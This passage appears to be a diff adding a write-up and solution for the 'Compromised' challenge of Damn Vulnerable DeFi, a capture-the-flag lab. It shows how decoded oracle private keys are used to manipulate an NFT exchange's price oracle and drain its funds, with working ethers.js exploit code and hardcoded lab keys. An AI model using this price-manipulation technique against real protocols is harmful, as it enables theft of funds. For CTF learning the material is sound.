@@ -480,3 +480,56 @@ it('Exploit', async function () {
   await this.governance.connect(attacker).executeAction(1);
 });
 ```
+
+## 7 - Compromised
+
+Solution to this challenge is a litle bit random, I find it very confusing especially for beginners. It doesn't look like real life scenario, but it teaches you some new things, so let's get into it.
+
+Firstly let's see the contracts. The main contract is **Exchange.sol**, it has simple utility, you can buy and sell NFT for price that is determined inside **TrustfulOracle.sol**. So, most likely we will manipulate the price somehow. The goal is to drain all funds from the exchange, we start with 0.01 eth. Now, if you take a closer look at **TrustfulOracle.sol**, the way it works is that in order to set the price you must have a special role. There is no obvious way to get that role since it's initialized in constructor. But, if you have looked at official instructions for this level on [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/), you would've noticed bunch of random confusing numbers.
+
+As it turns out those are the 2 encoded private keys. You can decode them like this: HEX => ascii, ascii => base64. As a matter of fact those are the 2 private keys from trusted oracles, so we just need to find the way how to turn those keys in signer wallet with ethers.js and manipulate the price inside **TrustfulOracle.sol**. Firstly we'll set the price very low to buy, and then we'll set it to the whole balance of exchange so that once we sell we get all the funds.
+
+Solution code:
+
+**compromised.challenge.js**
+
+```js
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const key1 =
+    '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+  const key2 =
+    '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+
+  const oracle1 = new ethers.Wallet(key1, ethers.provider);
+  const oracle2 = new ethers.Wallet(key2, ethers.provider);
+
+  const orc1Trust = this.oracle.connect(oracle1);
+  const orc2Trust = this.oracle.connect(oracle2);
+
+  const setMedianPrice = async (amount) => {
+    await orc1Trust.postPrice('DVNFT', amount);
+    await orc2Trust.postPrice('DVNFT', amount);
+  };
+
+  let priceToSet = ethers.utils.parseEther('0.01');
+  await setMedianPrice(priceToSet);
+
+  const attackExchange = this.exchange.connect(attacker);
+  const attackNFT = this.nftToken.connect(attacker);
+
+  await attackExchange.buyOne({ value: priceToSet });
+
+  const tokenId = 0;
+
+  const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
+  priceToSet = balOfExchange;
+  await setMedianPrice(priceToSet);
+
+  await attackNFT.approve(attackExchange.address, tokenId);
+  await attackExchange.sellOne(tokenId);
+
+  priceToSet = INITIAL_NFT_PRICE;
+  await setMedianPrice(priceToSet);
+});
+```
